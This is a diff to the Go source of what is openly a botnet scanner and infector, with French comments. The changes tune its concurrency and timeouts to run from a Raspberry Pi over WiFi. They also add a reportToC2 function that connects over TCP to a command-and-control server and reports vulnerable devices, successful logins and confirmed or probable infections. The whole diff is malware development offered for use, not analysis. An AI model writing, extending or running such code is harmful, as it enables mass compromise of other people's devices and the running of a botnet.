@@ -28,19 +28,20 @@ import (
     ctx, cancel = context.WithCancel(context.Background())
     startTime = time.Now()
     
-    // Limiter le nombre de goroutines simultanées pour éviter de saturer le CPU/RAM
-    maxGoroutines = 200
+    // Limiter drastiquement le nombre de goroutines pour Raspberry Pi (WiFi)
+    // 20 connexions simultanées maximum pour éviter de saturer la pile réseau
+    maxGoroutines = 20
     sem = make(chan struct{}, maxGoroutines)
     
-    // Client HTTP réutilisable
+    // Client HTTP ultra-léger avec timeouts très courts
     httpClient = &http.Client{
         Transport: &http.Transport{
             TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-            IdleConnTimeout: 15 * time.Second,
-            MaxIdleConns: 500,
-            MaxIdleConnsPerHost: 50,
+            IdleConnTimeout: 2 * time.Second,
+            MaxIdleConns: 20,
+            MaxIdleConnsPerHost: 5,
         },
-        Timeout: 5 * time.Second,
+        Timeout: 2 * time.Second,
     }
 )
 
@@ -55,8 +56,6 @@ var (
 
 // Gestion des connexions concurrentes
 var (
-    // Sémaphore pour limiter les connexions concurrentes
-    sem = make(chan struct{}, 2000) // Augmenté à 2000 connexions concurrentes
     // Canal pour les résultats d'infection
     resultChan = make(chan string, 100)
     // Canal pour les cibles vulnérables
@@ -673,6 +672,15 @@ func checkDevice(target string, timeout time.Duration) int {
     return false
  }
  
+ // Envoyer un rapport au C2
+ func reportToC2(message string) {
+    if c2ServerIP == "" { return }
+    conn, err := net.DialTimeout("tcp", c2Server, 5 * time.Second)
+    if err != nil { return }
+    defer conn.Close()
+    fmt.Fprintf(conn, "SCAN_RESULT|%s", message)
+ }
+ 
  func processTarget(target string, rtarget string) {
     // Acquérir le sémaphore
     sem <- struct{}{}
@@ -683,10 +691,13 @@ func checkDevice(target string, timeout time.Duration) int {
     }()
 
     // Vérifier si l'appareil est vulnérable
-    if checkDevice(target, 10) == 1 {
+    deviceType := checkDevice(target, 10)
+    if deviceType > 0 {
         mutex.Lock()
         statusFound++
         mutex.Unlock()
+        
+        reportToC2(fmt.Sprintf("VULNÉRARE détecté sur %s (Type: %d)", target, deviceType))
         
         // Tenter de se connecter et d'exploiter
         loginSuccess := false
@@ -695,6 +706,7 @@ func checkDevice(target string, timeout time.Duration) int {
             statusLogins++
             mutex.Unlock()
             loginSuccess = true
+            reportToC2(fmt.Sprintf("LOGIN RÉUSSI sur %s", target))
         }
         
         if sendExploit(target) == 1 {
@@ -705,12 +717,14 @@ func checkDevice(target string, timeout time.Duration) int {
                 statusInfected++
                 mutex.Unlock()
                 fmt.Printf("[+] Infection confirmée: %s\n", targetIP)
+                reportToC2(fmt.Sprintf("INFECTION CONFIRMÉE sur %s", targetIP))
             } else if loginSuccess {
                 // Si on avait un login mais pas de confirmation immédiate, 
                 // on marque quand même comme potentiellement infecté
                 mutex.Lock()
                 statusInfected++
                 mutex.Unlock()
+                reportToC2(fmt.Sprintf("INFECTION PROBABLE sur %s", targetIP))
             }
         }
     }
@@ -754,6 +768,8 @@ func main() {
         mutex.Unlock()
         
         syncWait.Add(1)
+        // Petite pause pour ne pas saturer le WiFi de la Raspberry Pi
+        time.Sleep(10 * time.Millisecond)
         go processTarget(target + ":" + os.Args[1], target)
     }
 
